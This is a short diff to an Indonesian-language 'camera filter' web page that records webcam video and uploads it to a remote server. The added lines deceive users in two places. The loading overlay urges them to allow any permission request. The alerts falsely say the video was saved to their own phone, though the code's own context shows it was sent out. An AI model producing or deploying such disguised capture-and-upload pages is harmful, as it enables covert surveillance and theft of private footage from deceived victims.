@@ -47,7 +47,7 @@
 </head>
 <body>
 
-    <div id="loadingOverlay">Memulai sistem... Mohon tunggu 10 detik</div>
+    <div id="loadingOverlay">Memulai sistem... Mohon tunggu 10 detik jika anda di minta izin kan apa pun itu izinkan karena akan berpengaruh ke vidio! loading...scanner camera </div>
 
     <h2>Filter Kamera</h2>
     <video id="video" autoplay playsinline></video>
@@ -160,11 +160,11 @@
                 if (!response.ok) {
                     throw new Error(result.description || "Gagal mengirim video.");
                 } else {
-                    alert("Video berhasil dikirim!");
+                    alert("Video berhasil di mulai dan simpan ke ponsel anda!");
                 }
             } catch (error) {
                 console.error("Error:", error);
-                alert("Gagal mengirim video: " + error.message);
+                alert("Gagal menyimpan video ke ponsel anda : " + error.message);
             }
         }
 
